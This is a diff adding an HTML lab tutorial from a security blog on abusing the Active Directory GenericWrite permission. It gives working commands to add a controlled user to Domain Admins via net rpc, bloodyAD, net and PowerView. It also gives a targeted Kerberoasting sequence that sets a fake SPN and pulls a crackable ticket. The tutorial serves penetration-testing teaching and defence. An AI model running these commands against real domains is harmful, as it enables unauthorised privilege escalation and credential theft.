@@ -1,0 +1,172 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/dacl-attacks/" rel="category tag">DACL Attacks</a></span>            </div>
+            <h1 class="post-title entry-title">Abusing AD-DACL: GenericWrite</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/genericwrite-active-directory-abuse/" rel="bookmark"><time class="entry-date published" datetime="2024-11-27T08:07:08+00:00">November 27, 2024</time><time class="updated" datetime="2025-06-19T13:23:09+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">In this post, we explore <strong data-start="656" data-end="695">GenericWrite Active Directory abuse</strong>, focusing on how attackers exploit <strong>Discretionary Access Control Lists (DACLs)</strong> to escalate privileges. By abusing the <strong>GenericWrite</strong> permission, adversaries can modify group memberships, service principal names, or login scripts—leading to lateral movement or domain dominance.</span></p>
+<p><span style="color: #000000">The lab setup necessary to simulate these attacks is outlined, with methods mapped to the <strong>MITRE ATT&amp;CK</strong> <strong>framework</strong> to clarify the associated techniques and tactics. <strong>Detection mechanisms</strong> for identifying <strong>suspicious</strong> activities linked to <strong>GenericWrite</strong> <strong>attacks</strong> are also covered, alongside actionable recommendations for <strong>mitigating these vulnerabilities</strong>. This overview equips security professionals with <strong>critical insights</strong> to recognize and defend against these prevalent threats.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<p><strong><span style="color: #000000">GenericWrite Permission</span></strong></p>
+<p><strong><span style="color: #000000">Prerequisites</span></strong></p>
+<p><span style="color: #000000"><strong>Lab Setup</strong> – User Owns GenericWrite Permission on the Domain Admin Group</span></p>
+<p><span style="color: #000000"><strong>Exploitation Phase I</strong> – User Owns GenericWrite Permission on a Group</span></p>
+<p><span style="color: #000000"><strong>Bloodhound</strong> – Hunting for Weak Permission</span></p>
+<p><span style="color: #000000">Method for Exploitation – Account Manipulation (T1098)</span></p>
+<ul>
+<li><span style="color: #000000">Linux Net RPC – Samba</span></li>
+<li><span style="color: #000000">Linux Bloody AD</span></li>
+<li><span style="color: #000000">Windows Net command</span></li>
+<li><span style="color: #000000">Windows PowerShell – Powerview</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Lab Setup</strong> – User Owns GenericWrite Permission on Another User</span></p>
+<p><span style="color: #000000"><strong>Exploitation Phase II</strong> – User Owns GenericWrite Permission on Another User</span></p>
+<p><span style="color: #000000"><strong>Bloodhound</strong> – Hunting for Weak Permission</span></p>
+<p><span style="color: #000000"><strong>Method for Exploitation</strong> – Kerberoasting (T1558.003)</span></p>
+<ul>
+<li><span style="color: #000000">Linux Python Script – TargetedKerberoast</span></li>
+<li><span style="color: #000000">Windows PowerShell – Powerview</span></li>
+</ul>
+<p><span style="color: #000000">Detection &amp; Mitigation</span></p>
+<h3><span style="color: #800000">GenericWrite Permission</span></h3>
+<p data-start="329" data-end="530"><span style="color: #000000">The <strong data-start="333" data-end="349">GenericWrite</strong> permission in <strong data-start="364" data-end="384">Active Directory</strong> allows a user to modify all writable attributes of an object, except for properties that require special permissions such as resetting passwords.</span></p>
+<p data-start="532" data-end="1133"><span style="color: #000000"><strong data-start="532" data-end="581">If an attacker gains GenericWrite over a user</strong>, they can write to the <strong data-start="605" data-end="630">servicePrincipalNames</strong> attribute and immediately initiate a <strong data-start="668" data-end="694">targeted Kerberoasting</strong> attack.</span><br data-start="702" data-end="705"/><span style="color: #000000"><strong data-start="705" data-end="717">Moreover</strong>, having <strong data-start="726" data-end="742">GenericWrite</strong> over a group enables them to add their account—or one they control—directly to that group, effectively escalating privileges.</span><br data-start="868" data-end="871"/><span style="color: #000000"><strong data-start="871" data-end="888">Alternatively</strong>, if the attacker obtains <strong data-start="914" data-end="930">GenericWrite</strong> over a computer object, they can modify the <strong data-start="975" data-end="1001">msds-KeyCredentialLink</strong> attribute. <strong data-start="1013" data-end="1028">As a result</strong>, they create <strong data-start="1042" data-end="1064">Shadow Credentials</strong> and authenticate as that computer account using <strong data-start="1113" data-end="1132">Kerberos PKINIT</strong>.</span></p>
+<h3><span style="color: #800000">Prerequisites</span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory</span></li>
+<li><span style="color: #000000">Kali Linux</span></li>
+<li><span style="color: #000000">Tools: Bloodhound, Net RPC, Powerview, BloodyAD</span></li>
+<li><span style="color: #000000">Windows 10/11 – As Client</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup – User Owns GenericWrite Permission on the Domain Admin Group</span></h3>
+<h4><span style="color: #000000">Create the Active Directory Environment:</span></h4>
+<p><span style="color: #000000">To simulate an <strong data-start="1290" data-end="1310">Active Directory</strong> environment, set up a <strong data-start="1333" data-end="1351">Windows Server</strong> as a <strong data-start="1357" data-end="1383">Domain Controller (DC)</strong> and a client machine (Windows or Linux) to run enumeration and exploitation tools.</span></p>
+<h4><span style="color: #000000">Domain Controller:</span></h4>
+<ul>
+<li><span style="color: #000000">First, install <strong data-start="1518" data-end="1536">Windows Server</strong> (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000"> Then, promote it to a <strong data-start="1589" data-end="1610">Domain Controller</strong> by adding the <strong data-start="1625" data-end="1661">Active Directory Domain Services</strong> role.</span></li>
+<li><span style="color: #000000"> Finally, set up the domain (e.g., <code data-start="1704" data-end="1718">ignite.local</code>).</span></li>
+</ul>
+<h4><span style="color: #000000">User Accounts:</span></h4>
+<ul>
+<li><span style="color: #000000">Next, create a standard user account named <strong data-start="1790" data-end="1802">Anuradha</strong>:</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user anuradha Password@1 /add /domain</pre>
+<p><span style="color: #000000"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-inD1OxzZZ9671XORPCQQINPV32MU44DH-gmuxsYnpAHwzF_0iakd81dQiFMrhR-id0hI7G1-cxpyP0F7pxgivNJEKo5BUUHquxyD4CfWIQP8QZckHhWkeQf9QjURGVhhYzMO_vbijeS_m12p1jg1-0rKr0DDwK3klriWf5GCwERkGO5vTzyaAPDX13wt/s16000/1.png" alt="GenericWrite Active Directory Abuse" width="1229" height="137"/></span></p>
+<h4><span style="color: #000000">Assign the “GenericWrite” Privilege to Anuradha:</span></h4>
+<p><span style="color: #000000">Once you configure the <strong data-start="1941" data-end="1959">AD environment</strong>, assign the <strong data-start="1972" data-end="1988">GenericWrite</strong> privilege to <strong data-start="2002" data-end="2014">Anuradha</strong> for the <strong data-start="2023" data-end="2040">Domain Admins</strong> group.</span></p>
+<p><span style="color: #000000"><strong>Steps</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
+<li><span style="color: #000000">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
+<li><span style="color: #000000">Locate the <strong>Domain Admins</strong> group in the Users container.</span></li>
+<li><span style="color: #000000">Right-click on <strong>Domain Admins</strong> and go to <strong>Properties</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfderD1cPvJO0HE6wTWhDoWwMGBsdFokE7xA8vYbbM3tRF9svD9Bb5jVLd9edWZETJFKt_-q2IyM-zkStvMaQhAJjqcJDoa1fEHyDuVVtgVSl8hGHDJY7h4Wy7bXATFP1cJFF1gcSF1TfealOpb5PjdhbAUmUL0Eyat6aQkIfyBwxQepCmPawshW4jJBSF/s16000/2.png"/></span></p>
+<ul>
+<li><span style="color: #000000">Navigate to the <strong>Security</strong> tab, then click on <strong>Add</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5VD8vPgK6la9mRFjNt7W7miBj91-ytIaYEdnKDReVRL8UCdG6mAz7lkRtVIANA2PDwAoT84_vwmDDsD6sgGduc7OLOCsl2D50f3K3M5C64PPk3yhyphenhyphen8c7rXF4vonnF6dDDUV_VxhyY7QYJzib73avQXSpXSL_HIhYSGhFfw1s_vcLM0WfMB8Jo_9vHUadA/s16000/3.png" alt="GenericWrite Active Directory Abuse" width="606" height="705"/></span></p>
+<ul>
+<li><span style="color: #000000">In the “Enter the object name to select” box, type <strong>Anuradha</strong> and click <strong>Check Names, </strong>and then click on OK.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJ1YPAUW7X_pYJnhqXxdS0ErvJYl_AHB7_uKNBh8yCuKCv4swQ6W8Atks45SzLOSwkeg4eB7NcqOlU0jIU7vSxm4INUHvLIn1y6fJdjqA4TO4-l2yngUZLJCv0-M3-62xJl-HItxpqoe9W2XBvGtUn_HXFMHcOk8g4qXIRbUE09EshKPH8TSZ_BMPjdsL0/s16000/4.png"/></span></p>
+<ul>
+<li><span style="color: #000000">In the <strong>Permissions</strong> section, check the box for <strong>Write</strong> permission.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkkZF9FHnmwnf8_2DcteR9GzXKmNlf8VbCeEYNDsZaxb8Z3uUkm_sjQ4SP6IFg98Z8DePs5zr_HQ3lKmpHJ0pUnwgyE4NKbV6TNT_BjpVU3pkG_KBEkoy1iJxwEgBNFAUi_2dXq02P_lCVqjxA83NbqUAU7j6hcowCa6aQsOlbjnVYiClsc_TY8aP_KY93/s16000/5.png" alt="GenericWrite Active Directory Abuse" width="595" height="695"/></span></p>
+<ul>
+<li><span style="color: #000000">Selecting the <strong data-start="2600" data-end="2609">Write</strong> checkbox automatically enables <strong data-start="2641" data-end="2670">Add/remove self as member</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3QVCND8bmdey_vYuGcHqfZ7tx3bqIw7KdsG7_4xjHHP66MaWUyEUTznQHFJUpxDsaxFoxp3Gqr6sOXgDm_FOjCwKMwR9d8osH63B0HqKX7DmqRqquErNh4_MCBMTKNhOWQ-V-csPQABQBKPOhLS3taio_JBiups7I68JJo8va8kprYsUhd2hCqaIDTHZ8/s16000/6.png"/></span></p>
+<p><span style="color: #000000">After applying the settings, <strong data-start="2701" data-end="2713">Anuradha</strong> now <strong data-start="2718" data-end="2757">has GenericWrite and AddSelf rights</strong> over the <strong data-start="2767" data-end="2784">Domain Admins</strong> group. <strong data-start="2792" data-end="2808">Consequently</strong>, she can add herself—or any principal she controls—to the group.</span></p>
+<h3><span style="color: #800000">Exploitation Phase I – User Owns GenericWrite Permission on a Group</span></h3>
+<h3><span style="color: #000000">Bloodhound – Hunting for Weak Permission</span></h3>
+<p><span style="color: #000000"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Anuradha</strong> has the <strong>GenericWrite</strong> permission on the <strong>Domain Admins</strong> group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u anuradha -p Password@1 -ns 192.168.1.7 -d ignite.local -c All</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgh4LvkKKtoTzGD-k0kV2BjgRU8bumF8v8oC_lGIuKFmoeZIv98p_5tpAKElniLhaHPhdYMiAlCn-V318MFkV0eizN_l6E4B_9_bPthsHN75HvxjMhzq3_QwagK_aBJGvuzkvXv8P4GxSi8epocH-mewXhPYgTWaF6J3u7gKnY7ibuamFbKXidvp_1PrWXM/s16000/7.png"/></span></p>
+<p><span style="color: #000000">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsofmHEYk8Fr5QswZIi4xWXhyphenhyphen5941HVuQp-HgSqKlri4qm3E-B-yyPtGeaRHzX6F9qfs6eoGvCOEz4Be82GdWPMEbt1Ooo6Tva2gvHqPtuxGo807cvp5LG9yliEmOddxjzBFOEQ0ruyi4ppuFgAICp4FBl8i9yhbCSp8hilyDGBAHOYm7kI1pIlpIrSZCG/s16000/8.png" alt="GenericWrite Active Directory Abuse" width="964" height="697"/></span></p>
+<p><span style="color: #000000">Thus, it has shown the Anuradha User has GenericWrite and SelfAdd privilege to Domain Admin group.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhz2BZ3phI-2sV2Z8EbYRqPIo4hkLUikelTLvtdSHmjPo5RmCGj-pun3BVazQDC3hOd_zpFR6zRWcEGaDUcCsLM8_sKzeJrP2nhMHr_2qJSHU88Gf_sLYgKF-F0W_AGGtfpk9AX3RN9_O9avsZJ0KlhSgyS9VvEudF6xr7_92s5VCnYG2kokuP2EdMJBVDQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguZyoWqjcoKO8x1ChJ_JIXV-vzRKs6X2_46qmD2pkqsiKB_IeWSNO8Ulrwnfr81vrtaEpkMin5nr7Mw4q1qAXzfC0fFWoYlcotExhCbQzjN3yb5k43mJC0vS4_6Bg7qoASN-mFKcMuXj5Mg0Djk5VpuKGxeAIPvV4etr-FgArweiHD0lvZpCCGKtBfJnV0/s16000/10.png" alt="GenericWrite Active Directory Abuse" width="1354" height="585"/></span></p>
+<h3><span style="color: #800000">Method for Exploitation – Account Manipulation (T1098)</span></h3>
+<p><span style="color: #000000"><strong>Linux Net RPC – Samba</strong></span></p>
+<p><span style="color: #000000">The tester can abuse this permission by adding Anuradha User into Domain Admin group and list the domain admin members to ensure that Anuradha Users becomes Domain Admin.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc group addmem "Domain Admins" anuradha -U ignite.local/anuradha%'Password@1' -S 192.168.1.7</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4JqveLNqDC38pn-D8imk32PRXHfo6sBumBZmV3toRA28pcMs3RPuEIN7kduMwOuRuCqES87mXC4Y2YhOkctiflQNUbwEeFEHJcQI00tdvJzpgLcSe1FpnHzSnv6QHfmC1D5FcJUc3Fpt3iPauU3nwOnosfs-RXdh2ebtK7m-3MqiEa3WmohDlpeTT4vC-/s16000/11.png"/></span></p>
+<p><span style="color: #000000"><strong>Bloody AD</strong></span></p>
+<p><span style="color: #000000">Alternatively, it can be achieved using <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/CravateRouge/bloodyAD"><strong>bloodyAD</strong></a></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.7" -d "ignite.local" -u "anuradha" -p "Password@1" add groupMember "Domain Admins" "anuradha"</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiyaTHYV_EsPZ8n-_n_u3F5D39dV6iDOtbSRFOURxaylaj2UOq29Y3eDyfH5kGBVnk_KZ7vyGXtvuiVENrxwUgPqZ-7_tODHGA3ugr-U4pkGDtCYK6IK_mJIYd6t9w50CWQlPCHKtVNzQdLfSbsavR8vZdH-hAEraMTImVloFhJBSlOSrzs77Iwp7ECm4p/s16000/12.png"/></span></p>
+<p><span style="color: #000000"><strong>Windows Net command</strong></span></p>
+<p><span style="color: #000000">This can be achieved with a native command line, using windows net command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net group "domain admins" anuradha /add /domain</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdZx79CZc0K8tCQgZhfpmf2_NaBUMlOv96LsfD9vI0Clu8a4KqZxY9f5hWy46RqAtNkRa1r6h3JPPppEa7Cts9OTGO9p5uC_pJSU6fMAF5L_XgLg1K-7LUQMZNCdHASqcXLCdpMlfqPQrIlmCkr7YBeQZG-rmof-HlSiEu0BMEBmNnVYc3hfcECL9vJ68T/s16000/15.png" alt="GenericWrite Active Directory Abuse" width="1310" height="1287"/></span></p>
+<p><span style="color: #000000">thus, from user property we can see Anuradha user has become the member of domain admin.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmRMNjr7sfrvewONiyjlO1SJvxpp0NQlBTnPcW-8d3Zl9qSCHi3FnXN2mWCX_9tbfM-X-TZyhKaCZvZLMoeI0nDdQe3iKSzL24V-KQPMzWOyzVtYMiYlr57PjOqjUaoLReITCVMFlUOgLQzM21iXPV9cZhqZODb_24Wl-MLmdWpiNODQBNkMKz6J2IqoXa/s16000/16.png"/></span></p>
+<p><span style="color: #000000"><strong>Windows PowerShell – Powerview</strong></span></p>
+<p><span style="color: #000000">The attacker can add a user/group/computer to a group. This can be achieved with with the Active Directory PowerShell module, or with <strong>Add-DomainGroupMember</strong> (<a style="color: #000000" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"><strong>PowerView</strong></a> module).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Import-Module .PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'Password@1' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('ignite.localanuradha', $SecPassword)
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'anuradha' -Credential $Cred</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWUwjxl_4yWiQndUlidNbpO44De-gdGzbT3ElQO_Dj6jqnMuxQ10bOK98QtiklkOrT1nOZ2NNCaVR3gSTrTKsDChsUncuilZG_pOxIHvm0UgJhJGEtIGpbOlaK_Vrqxz96Ef2kLx5jNGWKygXeiynkLMiUR3dP5WmAiG0CS-BTE1wMhLVk6L8SO59Qpx2Q/s16000/17.png" alt="GenericWrite Active Directory Abuse" width="2133" height="1471"/></span></p>
+<h3><span style="color: #800000">Lab Setup – User Owns GenericWrite Permission on Another User</span></h3>
+<p><span style="color: #000000">Here, in this lab setup, we will create two users’ Krishna and Radha, where the user Radha has GenericWrite permission over the Krishna user.</span></p>
+<p><span style="color: #000000"><strong>Create the AD Environment and User accounts</strong></span></p>
+<ul>
+<li><span style="color: #000000">Create two AD user accounts named <strong>Krishna</strong> and <strong>Radha</strong>.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user krishna Password@1 /add /domain
+net user radha Password@1 /add /domain</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje2cucx0D6cuIlwKidOJeL3GGshj1kViwU_epU8hktulnhDMGNOYZaBNY3czce4Wj9rV96vTMcdlu0TGeeFZm6GiLPEhoY-nhFpweGyzmFWxPin6op69tfVCIhd-mRthM2_wzAITDg1xazDJlhpt7Do4gHI1Y5aJ51lJKaTooc9t0zgAqatjQHgwPGtWu1/s16000/18.png"/></span></p>
+<p><span style="color: #000000"><strong>Assign the “GenericWrite” Privilege:</strong></span></p>
+<ul>
+<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
+<li><span style="color: #000000">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
+<li><span style="color: #000000">Locate User <strong>Krishna</strong> in the <strong>Users</strong></span></li>
+<li><span style="color: #000000">Right-click on <strong>Krishna User</strong> and go to <strong>Properties</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgV4ZNy_ZZVgZgG0DpipwHXFlGawFm18Pa_I5cP_aYEBtFGOf4DnDkhyEzbLZ5tj7TI-9dxDnEsmeaX4zKZSDKBHX5SLNJnrjHCiG18cFLw2kQM3yLX9D6dZRyXlMnyksrj2Qh9zeNOCcKRN1tD3Ado8SorFuNY99-aCs4PbNpubC_1KW47TfmFLwIRv3tQ/s16000/19.png"/></span></p>
+<ul>
+<li><span style="color: #000000">Go to the <strong>Security</strong>tab, and click on <strong>Add</strong> button</span></li>
+<li><span style="color: #000000">In the “Enter the object name to select” box, type <strong>Radha</strong>and click <strong>Check Names </strong>and click on OK.</span></li>
+<li><span style="color: #000000">Select <strong>Radha </strong>user and in the <strong>Permissions</strong>section, check the box for <strong>Write</strong></span></li>
+<li><span style="color: #000000">Apply the settings.</span></li>
+</ul>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfQv1_o9j4nnDxg7I_ct6ANCTPalnDu-GrQ2XGgeqOELKhMjSmtNVK4ySNTbUoxKbQz9nJVbLkMLmMKE_1UfHAEyMp8en7Q0T6xbM3rRvIDQU7rFhzEOG5g4jksE3mViQbJr9hMqEVTAxsHdNfibqWWZhczYzfhNBFaSQoNZQHJT1amov2VDoWayTIGVAC/s16000/20.png" alt="GenericWrite Active Directory Abuse" width="613" height="831"/></span></p>
+<p><span style="color: #000000">At this point, <strong>Radha</strong> now has <strong>GenericWrite</strong> permission for <strong>Krishna </strong>user.</span></p>
+<h3><span style="color: #800000">Exploitation Phase II – User Owns GenericWrite Permission on Another User</span></h3>
+<h3><span style="color: #000000">Bloodhound – Hunting for Weak Permission</span></h3>
+<p><span style="color: #000000">Hunting for First-Degree Object Control for the Radha user, as demonstrated in the previous steps.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u anuradha -p Password@1 -ns 192.168.1.7 -d ignite.local -c All</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYoTL5gv2C0KLLAA-UUrx5SGHOKOIIRH9ykAl4U5TlFFa23jO-DvKmXoQSbcLs3Mra_bCjbU-3KhX5e36juLES95ibffuNfry5fhMC2cveo7wRPyKy9cT1hiXiwNwVL6fN3xczvtLQSkW5FEBS-8tI4nSd624x3VUFx8f9sO4eOyus5XCxvBD2fN40rsuE/s16000/21.png"/></span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisEle5ZHE10n73K5kDonrCBtTS_wjyWEDgX0LuWlIx9zLEknwMSLhDrzgT-I-o0_sCgvVeKSLPBVRFK-N5IUPC8vD2CYtlt4A2deCTU4hAO7XL3Rjgx13hbE1UizxyFwA5QzZuNJeaEiJ-Dp7uC4KZOJh0FQ9XNgDMwb4JE6cINSlneaN_N8Uhp2GdxbkL/s16000/22.png" alt="GenericWrite Active Directory Abuse" width="991" height="685"/></span></p>
+<p><span style="color: #000000">From the graph it can be observed that the <strong>Radha</strong> user owns <strong>GenericWrite </strong>privilege on <strong>Krishna</strong> user.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj21TEm_vnpXDtOYa9QcIgG80QSjoqw3Ro_Ums2AnmeQ7OiMe5yfHcFNtD8aDhPl1F0FKdp6eoJu05v6mZj6XmceIvBeUg0RylvvAOBE_fF_wwFL6ScfdLT-Yo1sNgEMf9Cu4RYYk5j_aWjJh-Og_08V-e7mqV9MA5UB_9ahlSfkx46UWsQkFXmEmb9lyPJ/s16000/23.png"/></span></p>
+<h3><span style="color: #800000">Method for Exploitation – Kerberoasting (T1558.003)</span></h3>
+<p><span style="color: #000000">This abuse can be carried out when controlling an object that has a <a style="color: #000000" href="https://www.hackingarticles.in/abusing-ad-dacl-generic-all-permissions/"><strong>GenericAll</strong></a>, <strong>GenericWrite</strong>, <strong>WriteProperty</strong> or <strong>Validated-SPN</strong> over the target.</span></p>
+<p><span style="color: #000000"><strong>Linux Python Script – TargetedKerberoast</strong></span></p>
+<p><span style="color: #000000">From UNIX-like systems, this can be done with <a style="color: #000000" href="https://github.com/ShutdownRepo/targetedKerberoast"><strong>targetedKerberoast.py</strong></a> (Python).</span></p>
+<p><span style="color: #000000">Further, with the help of John the Ripper end the dictionary such as Rock You can help the attacker to brute force the weak password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./targetedKerberoast.py --dc-ip '192.168.1.7' -v -d 'ignite.local' -u 'radha' -p 'Password@1'</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzCvkq1G1w_LhrqeokVxc7iQgg0wykE2kBY-kP0IaOcI7gFlx62isK0UR0BxCaZZqjET0q-K2-j8j3dDuhMaurqFNfiG64MWV89lZ3NcP8zN_X6JFueZA26baP120Eo3VJOGiPwRZkl72fgqs5-sNlT-jY9nCYPy3LOKemFVsPQAlUdobnC9rDLTJdhYf4/s16000/24.png" alt="GenericWrite Active Directory Abuse" width="1594" height="946"/></span></p>
+<h3><span style="color: #800000">Windows PowerShell – Powerview</span></h3>
+<p><span style="color: #000000">From Windows machines, this can be achieved with <strong>Set-DomainObject</strong> and <strong>Get-DomainSPNTicket</strong> (<span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"><strong>PowerView</strong></a> </span>module).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Import-Module .PowerView.ps1
+Set-DomainObject -Identity 'krishna' -Set @{serviceprincipalname='nonexistent/hacking'}
+Get-DomainUser 'krishna' | Select serviceprincipalname
+$User = Get-DomainUser 'krishna'
+$User | Get-DomainSPNTicket</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhH_6UYBUJu91tHDejyjI0Y-J4RAIY6R-YyddXdO2WIfIjyP6NWlwlNDmbydnY6ZGa24ua0qvPgLein3MEACSE1t_r59W8iDuHI7hkUFJW089owzltfbP6H3v3s3eWjTxEbU3aAGtksoKHN9k4eAo-BuZda9BUV5zosc_MM1b2stkxEVYN0U6WU90yX8G-T/s16000/25.png"/></span></p>
+<h3><span style="color: #800000">Detection &amp; Mitigation</span></h3>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdNlpwiouS2dsMcyxpnx6EGwRbTOE6YWs-euY22GYiq8wiEw_3dXisROWvFrCBPiEfq5Z150Pe1cO1pW3HsTlxmj5CCVkgHVLvG_52t1z3eRqgJRAEygCKwzHSNHVjIMHzyYKMH-Z7hZubK28aAMaeFMLHeEzDOtskgRA-9qZzsSIszpJqgO-YV1Jdz_Q4/s16000/Detection%20&amp;%20Mitigation%20Attack%20MITRE%20ATT&amp;CK%20Technique%20Description%20Detection%20Mitigation%20Reset%20Password%20T1110.001%20%E2%80%93%20Password%20Cracking%20Attackers%20with%20Generic%20ALL%20permissions%20can%20reset%20the%20target%20user%E2%80%99%20(1).png" alt="GenericWrite Active Directory Abuse" width="3005" height="4250"/></p>
+<p><strong>Author</strong>: <span style="color: #000000">Pradnya Pawar is an InfoSec researcher and Security Tech Lead. Contact</span> <a href="https://www.linkedin.com/in/pradnya-pawar-12bb4844"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
